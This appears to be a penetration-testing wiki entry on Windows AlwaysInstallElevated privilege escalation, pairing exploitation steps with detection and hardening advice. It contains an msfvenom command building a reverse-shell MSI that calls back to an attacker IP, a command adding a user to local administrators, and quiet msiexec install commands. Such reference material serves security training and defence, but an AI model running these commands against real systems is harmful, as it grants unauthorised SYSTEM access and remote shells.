---
title: AlwaysInstallElevated
slug: always-install-elevated
---

> **TL;DR:** When both HKLM and HKCU `AlwaysInstallElevated` registry values are set to 1, any MSI a low-priv user runs is installed as NT AUTHORITY\SYSTEM — drop an MSI payload and `msiexec /quiet /i` your way to root.

## What it is
`AlwaysInstallElevated` is a Group Policy setting that tells Windows Installer to use elevated privileges when installing MSI packages, regardless of the invoking user. Microsoft itself flags this as a security risk in the policy description because it effectively grants SYSTEM to any caller. To take effect both values must be `1`:

```
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

## Preconditions / where it applies
- Windows host with Windows Installer service enabled (default).
- Both HKLM and HKCU registry values set to `0x1` (often pushed by misconfigured GPO or legacy software-distribution scripts).
- Foothold as a low-privileged interactive or session user — works in user sessions, not in headless service accounts that cannot launch MSI.
- Most common on workstations managed by older SCCM/altiris-style packaging where admins wanted unattended user-driven installs.

## Technique
1. Enumerate the policy values:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`, you are in.

2. Generate an MSI payload. `msfvenom` produces a working installer:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o pwn.msi
```

For a fileless variant, the WiX-based `WixSharp` or a hand-rolled MSI with a CustomAction running `cmd.exe /c net localgroup administrators user /add` also works.

3. Transfer the MSI to the target and execute via `msiexec` with quiet flags so the GUI does not block:

```cmd
msiexec /quiet /qn /i C:\Users\Public\pwn.msi
```

`/quiet` suppresses UI, `/qn` enforces no UI, `/i` performs install. The installer service (`msiserver`, runs as SYSTEM) executes the package's custom actions elevated.

4. Catch the SYSTEM callback or verify the new local admin. PowerShell equivalent: `Start-Process msiexec.exe -ArgumentList '/quiet /qn /i C:\Users\Public\pwn.msi'`.

Discovery shortcuts: `winPEAS`, `PowerUp`'s `Get-RegistryAlwaysInstallElevated`, or Seatbelt all flag this in one shot.

## Detection and defence
- Blue team: Windows Installer logs in `Application` event log show MSI installs by non-admin users running with SYSTEM context — events 1033/1034 with an unusual user SID are suspicious. Sysmon process-create event (ID 1) of `msiexec.exe` spawned from a user-shell with `/quiet` flags and writing to `C:\Users\<user>\AppData\Local\Temp` should alert.
- Hardening: set both registry values to `0` or delete them. Group Policy: `Computer/User Configuration > Administrative Templates > Windows Components > Windows Installer > Always install with elevated privileges = Disabled` (must be Disabled in BOTH Computer and User scopes).
- Application allow-listing (WDAC/AppLocker) MSI rules block unsigned packages from running even if the policy is set.
- Related: [[weak-service-permissions]], [[unquoted-service-paths]], [[dll-hijacking-privesc]].

## References
- [Microsoft — AlwaysInstallElevated policy reference](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) — Official documentation including the security warning.
- [HackTricks — AlwaysInstallElevated](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated) — Enumeration and exploitation walkthrough.
- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) — One-liners and MSI generation recipes.
